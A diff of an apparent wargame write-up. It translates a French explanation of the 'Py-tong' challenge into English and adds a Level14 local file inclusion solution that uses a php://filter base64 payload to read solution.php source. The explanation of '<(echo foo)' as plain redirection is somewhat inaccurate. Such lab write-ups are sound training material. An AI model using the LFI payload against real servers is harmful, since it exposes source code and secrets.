@@ -116,10 +116,11 @@ ls
 ```
 ## Py-tong
 ### Level12
-pour resoudre cet challenge on utilise le commande suivant ./pytong <(echo foo)
-    ./pytong : C'est l'exécution du binaire pytong qui est le script Python à exploiter.
-    < : C'est l'opérateur de redirection, il prend la sortie de la commande suivante et l'utilise comme entrée pour ./pytong.
-    (echo foo) : Cela génère la chaîne "foo" et la passe comme entrée à ./pytong.
+To solve this challenge, the following command is used: ./pytong <(echo foo)
+
+./pytong: This is the execution of the pytong binary, which is the Python script to exploit
+<: This is the redirection operator; it takes the output of the following command and uses it as input for ./pytong.
+(echo foo): This generates the string "foo" and passes it as input to ./pytong
 ```bash
 ./pytong <(echo foo)
 ```
@@ -127,3 +128,12 @@ pour resoudre cet challenge on utilise le commande suivant ./pytong <(echo foo)
 ### Level14
 One reason why I wanted the warchall box is to offer more realistic webhacking challenges.
 You may now try the Live LFI challenge that is hosted on it.
+```solution.php
+```
+Add this link to the url
+```php://filter/convert.base64-encode/resource=solution.php
+```
+Copy the text encrypted in base64 and decode it to the terminal
+```bash
+  echo "text_encrypted" | base64 -d
+```
